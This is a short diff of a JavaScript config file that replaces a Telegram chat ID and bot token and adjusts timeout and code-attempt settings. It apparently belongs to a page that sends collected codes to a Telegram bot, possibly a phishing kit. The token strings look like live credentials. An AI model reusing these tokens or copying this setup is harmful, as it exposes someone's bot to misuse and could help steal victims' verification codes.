@@ -1,7 +1,7 @@
 export const config = {
-    CHAT_ID: '1922578871',
+    CHAT_ID: '-4786567012',
 
-    TOKEN: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w',
+    TOKEN: '7669098850:AAFkB5IGIn8fK-pd086C9zjBtFvKWmTnGRo',
 
     BOT_CHAT_ID: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w2',
 
@@ -11,7 +11,7 @@ export const config = {
 
     LOAD_TIMEOUT_MS: 2000,
 
-    ERROR_COUNTDOWN_MS: 8000,
+    ERROR_COUNTDOWN_MS: 5000,
 
     MAX_CODE_ATTEMPTS: 5
 };
